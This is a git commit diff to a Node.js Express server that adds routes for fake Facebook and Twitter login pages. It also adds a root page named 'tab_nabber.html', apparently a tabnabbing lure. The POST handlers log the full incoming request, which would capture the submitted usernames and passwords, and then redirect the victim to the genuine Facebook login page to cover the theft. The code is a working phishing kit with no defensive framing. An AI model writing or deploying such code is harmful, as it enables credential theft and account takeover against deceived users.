cf71b5ba51c3adcf6cd62cb67fc26af2987aaa0d
mackaber <lhn@mackaber.me>
2021-05-22 13:17:10 -0500

    tried adding twitter

--- server.js
+++ server.js
@@ -7,11 +7,24 @@ const path = require("path")
 app.use(express.static("./public"))
 app.use(bodyParser.urlencoded({ exteded: true }))
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname,'./public/facebook.html'))
+app.get('/facebook/login', (req, res) => {
+  res.sendFile(path.join(__dirname, './public/facebook.html'))
 })
 
-app.post('/login.php',(req,res) => {
+app.get('/twitter/login', (req, res) => {
+  res.sendFile(path.join(__dirname, './public/twitter.html'))
+})
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, './public/tab_nabber.html'))
+})
+
+app.post('/facebook/login.php',(req,res) => {
+  console.log(req)
+  res.redirect(301, "https://es-la.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIwOTU0NjMxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D")
+})
+
+app.post('/twitter/login.php', (req, res) => {
   console.log(req)
   res.redirect(301, "https://es-la.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIwOTU0NjMxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D")
 })
